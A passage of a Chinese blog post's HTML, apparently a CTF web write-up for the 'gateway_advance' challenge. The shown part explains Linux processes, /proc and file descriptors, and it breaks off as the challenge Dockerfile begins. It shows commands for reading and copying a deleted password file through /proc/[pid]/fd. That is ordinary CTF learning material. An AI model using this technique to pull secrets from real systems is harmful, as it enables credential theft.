@@ -1,0 +1,1021 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="温柔刀">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="温柔刀">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="">
+    <meta name="description" content="声明：本博客为了梳理思路所整理。 gateway_advance相关知识lua 是什么？Lua 是一种非常轻量、简单、快速的编程语言。 它的特点是语法非常简洁；适合嵌入到别的系统里，比如游戏引擎、服务器。 我们常用的 Nginx 就支持 Lua 来写脚本，这种模块叫 OpenResty（或 lua-nginx-module），很遗憾，这么写笔者记不住……我们简单的把 Nginx+Lua&#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="L3NCTF-Web题目部分复现">
+<meta property="og:url" content="http://example.com/2025/07/18/L3NCTF-Web%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="三重门">
+<meta property="og:description" content="声明：本博客为了梳理思路所整理。 gateway_advance相关知识lua 是什么？Lua 是一种非常轻量、简单、快速的编程语言。 它的特点是语法非常简洁；适合嵌入到别的系统里，比如游戏引擎、服务器。 我们常用的 Nginx 就支持 Lua 来写脚本，这种模块叫 OpenResty（或 lua-nginx-module），很遗憾，这么写笔者记不住……我们简单的把 Nginx+Lua&#x3D;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1752786551828-995975c1-efb9-4e85-b4c2-c1bf6e7279d7.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1752786761372-39dd4138-8d93-4ed9-8cf8-3aab3410cc97.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1752847180654-a9893932-86a8-432b-af0d-f17e0943c46b.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1752847752695-3a7e082b-e6bf-40a3-bc01-ca9b337c3f84.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1752847881319-69fa787d-65de-4733-9db2-a3e99f7c2e20.png">
+<meta property="article:published_time" content="2025-07-18T07:10:59.000Z">
+<meta property="article:modified_time" content="2025-07-18T14:18:04.783Z">
+<meta property="article:author" content="温柔刀">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="Nginx">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1752786551828-995975c1-efb9-4e85-b4c2-c1bf6e7279d7.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>L3NCTF-Web题目部分复现 · Gentle_knife&#39;s Studio</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">Gentle_knife's Studio.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">Gentle_knife&#39;s Studio.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">L3NCTF-Web题目部分复现</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                L3NCTF-Web题目部分复现
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="wp">wp</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="Nginx">Nginx</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">5k</span>Reading time: <span class="post-count reading-time">22 min</span></span>
+                    </div>
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/07/18</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <p>声明：本博客为了梳理思路所整理。</p>
+<h1 id="gateway-advance"><a href="#gateway-advance" class="headerlink" title="gateway_advance"></a>gateway_advance</h1><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h3 id="lua-是什么？"><a href="#lua-是什么？" class="headerlink" title="lua 是什么？"></a>lua 是什么？</h3><p><strong>Lua</strong> 是一种非常轻量、简单、快速的编程语言。 它的特点是语法非常简洁；适合嵌入到别的系统里，比如游戏引擎、服务器。</p>
+<p>我们常用的 Nginx 就支持 Lua 来写脚本，这种模块叫 <code>OpenResty（或 lua-nginx-module）</code>，很遗憾，这么写笔者记不住……我们简单的把 Nginx+Lua&#x3D;OpenResty。只不过这里的加不是简单的集合，而是让 Nginx 变得更聪明，让 Lua 进行辅助。</p>
+<h3 id="进程-pid-proc-句柄-fd-symlink"><a href="#进程-pid-proc-句柄-fd-symlink" class="headerlink" title="进程,pid, &#x2F;proc,句柄,fd,symlink"></a>进程,pid, &#x2F;proc,句柄,fd,symlink</h3><h4 id="进程（process）"><a href="#进程（process）" class="headerlink" title="进程（process）"></a>进程（process）</h4><p> A <strong>process</strong> is an instance of a computer program <strong>in execution</strong>.  </p>
+<p>就是说，一个进程就是“正在执行中的程序”。</p>
+<ul>
+<li>你写的 <code>.py</code>、<code>.exe</code> 是程序（program）</li>
+<li>当你运行它之后，就变成了进程（process）</li>
+</ul>
+<p>我们写的代码是程序，运行中的程序是<strong>进程</strong>。</p>
+<h4 id="进程编号-PID-Process-ID"><a href="#进程编号-PID-Process-ID" class="headerlink" title="进程编号 PID (Process ID)"></a>进程编号 PID (Process ID)</h4><p><strong>PID 是 Process ID（进程编号）的缩写</strong>，是操作系统给每一个“正在运行的进程”分配的一个<strong>唯一数字标识符</strong>。  </p>
+<p>你可以在 Linux 中运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure>
+
+<p>来查看当前系统中所有运行中的进程和它们的 PID。</p>
+<p>PID 是内核用来<strong>管理进程</strong>的核心方式。</p>
+<ul>
+<li>杀掉一个进程：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill 12345  # 杀掉 PID 为 12345 的进程</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查某个程序是否还活着：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -p 12345</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看某个程序的文件描述符：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc/12345/fd/</span><br></pre></td></tr></table></figure>
+
+<h4 id="proc"><a href="#proc" class="headerlink" title="&#x2F;proc"></a>&#x2F;proc</h4><p>Linux 中的 <code>/proc</code> 目录是一个<strong>虚拟文件系统</strong>，里面每个子目录其实就是一个 PID。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc/</span><br></pre></td></tr></table></figure>
+
+<p>你会看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1/</span><br><span class="line">2/</span><br><span class="line">3/</span><br><span class="line">12345/</span><br></pre></td></tr></table></figure>
+
+<p>这些都是进程编号，进入里面可以看到这个进程打开了哪些文件、用的哪个命令启动的等等。</p>
+<h4 id="文件描述符-fd-File-Descriptor"><a href="#文件描述符-fd-File-Descriptor" class="headerlink" title="文件描述符 fd(File Descriptor)"></a>文件描述符 fd(File Descriptor)</h4><p><code>fd</code> 是 <strong>File Descriptor</strong> 的缩写，意思是「文件描述符」。</p>
+<p>一个文件本身不会有 fd,但是打开这个文件的进程会有，进程会用 fd 来表示“我打开了这个文件”。Linux 会给你打开的每一个东西，分配一个数字编号，叫“文件描述符”。 </p>
+<p>Linux 系统中，一切资源都被抽象为“文件”，所以：</p>
+<ul>
+<li>文件 → 有 fd</li>
+<li>socket → 有 fd</li>
+<li>管道 → 有 fd</li>
+<li>设备 &#x2F;dev&#x2F;null → 也有 fd</li>
+</ul>
+<p>文件描述符编号是啥？</p>
+<table>
+<thead>
+<tr>
+<th>FD 编号</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>0</code></td>
+<td>标准输入（stdin）</td>
+</tr>
+<tr>
+<td><code>1</code></td>
+<td>标准输出（stdout）</td>
+</tr>
+<tr>
+<td><code>2</code></td>
+<td>标准错误（stderr）</td>
+</tr>
+<tr>
+<td><code>3</code> 以后的</td>
+<td>是你代码或程序里通过 <code>open()</code>、<code>socket()</code> 等打开的额外文件或资源</td>
+</tr>
+</tbody></table>
+<p>假设你在终端输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>这个时候：</p>
+<p>Linux 会创建一个新的进程来运行 <code>cat</code>，这个程序会打开 <code>flag.txt</code>，内核会给这个文件分配一个 fd，比如是 3。然后你可以在 <code>/proc/[cat的pid]/fd/3</code> 里看到它。我们可以这么理解： fd 是文件的“编号”，程序要访问文件不是通过路径，而是通过这个编号访问。</p>
+<p>在 Linux 里你看到的 <code>/proc/1/fd/</code> 是一个“文件夹”，但它是<strong>虚拟的文件夹</strong>，不是存在硬盘上的，而是 <strong>由内核动态生成的</strong>。</p>
+<p>它的作用是：<strong>显示某个进程当前打开的所有“文件描述符（fd）”</strong>。</p>
+<p>来看个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /proc/1/fd/</span><br></pre></td></tr></table></figure>
+
+<p>可能输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0 -&gt; /dev/null</span><br><span class="line">1 -&gt; /dev/null</span><br><span class="line">2 -&gt; /dev/null</span><br><span class="line">3 -&gt; /app/log.txt</span><br><span class="line">6 -&gt; /secret/password.txt (deleted)</span><br><span class="line">0 -&gt; /dev/null</span><br></pre></td></tr></table></figure>
+
+<p>文件描述符 <strong>0</strong> 是标准输入。这里它指向 <code>/dev/null</code>，表示：这个进程的输入被重定向到了「黑洞」，永远读取不到任何内容。</p>
+<p><code>/dev/null</code> 是 Linux 中的「黑洞」文件，读取它得不到东西，写进去的东西会被丢弃。</p>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 -&gt; /var/log/mylog.txt</span><br></pre></td></tr></table></figure>
+
+<p>文件描述符 <strong>1</strong> 是标准输出。它被重定向到了日志文件 <code>/var/log/mylog.txt</code>。所以这个进程的「正常输出信息」会写入这个日志文件，而不是在屏幕上显示。</p>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 -&gt; /dev/null</span><br></pre></td></tr></table></figure>
+
+<p>文件描述符 <strong>2</strong> 是标准错误输出（stderr）。也被重定向到了 <code>/dev/null</code>，表示错误信息直接丢掉了，不显示也不保存。</p>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3 -&gt; socket:[12345]</span><br></pre></td></tr></table></figure>
+
+<p>文件描述符 <strong>3</strong> 是一个 socket（套接字）连接。<code>socket:[12345]</code> 表示这是一个网络连接或 IPC 连接，编号为 12345。</p>
+<p>它不是普通文件，而是网络资源，比如某个 TCP 连接。这个数字是内核中的 socket id。</p>
+<p>你可以通过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /proc/[pid]/fd/3</span><br></pre></td></tr></table></figure>
+
+<p>或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/[pid]/net/tcp</span><br></pre></td></tr></table></figure>
+
+<p>去进一步查它连接的是谁（比如 IP 和端口）。</p>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 -&gt; /tmp/password (deleted)</span><br></pre></td></tr></table></figure>
+
+<p>文件描述符 <strong>4</strong> 打开了 <code>/tmp/password</code> 文件。但后面写了 <code>(deleted)</code>，表示：<strong>文件已经从文件系统中被删除，<strong>但是</strong>这个进程还在用它。</strong></p>
+<p>为什么还能用？因为：Linux 删除文件只是删除了<strong>目录项（名字）</strong>，而不是文件本体（inode）。只要还有人用着，文件还在内存里。</p>
+<p>我们可以通过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/[pid]/fd/4</span><br></pre></td></tr></table></figure>
+
+<p>仍然能读出内容，甚至可以把它拷贝出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /proc/[pid]/fd/4 /tmp/recovered_password</span><br></pre></td></tr></table></figure>
+
+<p>这就是恢复“被删文件”的常用办法。</p>
+<h5 id="为什么已经删除了，我还可以通过-fd-看到它的内容？"><a href="#为什么已经删除了，我还可以通过-fd-看到它的内容？" class="headerlink" title="为什么已经删除了，我还可以通过 fd 看到它的内容？"></a><strong>为什么已经删除了，我还可以通过 fd 看到它的内容？</strong></h5><p>Linux 的文件删除机制是这样的：</p>
+<ol>
+<li>当你用 <code>rm file.txt</code> 删除一个文件时，Linux 并不会马上“彻底删除”它。</li>
+<li>它会先把 <strong>目录项</strong> 删除，但只要有程序正在用这个文件（打开着它），这个文件的“真实内容”还保留在磁盘和内存中。</li>
+<li>所以，<strong>只要有程序还在用这个文件，就可以继续通过文件描述符访问它！</strong></li>
+</ol>
+<h5 id="怎么分清-fd-和-pid"><a href="#怎么分清-fd-和-pid" class="headerlink" title="怎么分清 fd 和 pid?"></a>怎么分清 fd 和 pid?</h5><p> 进程对应的是pid，资源对应的是fd。</p>
+<h4 id="proc-self"><a href="#proc-self" class="headerlink" title="&#x2F;proc&#x2F;self"></a>&#x2F;proc&#x2F;self</h4><p><code>/proc/self</code> 是一个特殊的“动态符号链接”，<strong>永远代表“当前进程的 &#x2F;proc&#x2F;[pid]”</strong>。</p>
+<p>比如你在某个 shell 或 Python 程序里访问 <code>/proc/self/fd</code>，就是在访问你这个进程的文件描述符表。</p>
+<p>如果当前进程 pid 是 12345，那么&#x2F;proc&#x2F;self&#x2F;fd &#x3D;&#x3D;  &#x2F;proc&#x2F;12345&#x2F;fd</p>
+<h4 id="句柄-handle"><a href="#句柄-handle" class="headerlink" title="句柄(handle)"></a>句柄(handle)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A **handle** is a reference to a resource used by a process.</span><br></pre></td></tr></table></figure>
+
+<p>这个词理解起来有点困难，可以理解为 handle 就是被包装过的引用， 为了安全和抽象”，而返回给你的“间接引用“。在 Linux 里面我们不能直接对文件动手，只能以简洁的，也就是 handle 去进行改变。</p>
+<h4 id="符号链接（symlink）"><a href="#符号链接（symlink）" class="headerlink" title="符号链接（symlink）"></a>符号链接（symlink）</h4><p><code>symlink</code> 是 <strong>符号链接（symbolic link）</strong>，也叫 <strong>软链接</strong>，它是 Linux 文件系统中的一种指针型文件，作用相当于“快捷方式”。它本身是一个普通文件，内容是“它指向了哪里”。</p>
+<p><code>/proc/self/fd/6</code>这个文件名就是一个符号链接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/d/shortcut` 如果是一个 symlink，它可能指向 `/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h2 id="看看源码"><a href="#看看源码" class="headerlink" title="看看源码"></a>看看源码</h2><p><a target="_blank" rel="noopener" href="https://su-team.cn/posts/e3fd1be7.html">2025 L3HCTF SU WriteUp</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1752786551828-995975c1-efb9-4e85-b4c2-c1bf6e7279d7.png" alt="img"></p>
+<p>点开题目，只有一个 hello,world!</p>
+<p>那么，读读源码？</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1752786761372-39dd4138-8d93-4ed9-8cf8-3aab3410cc97.png" alt="img"></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 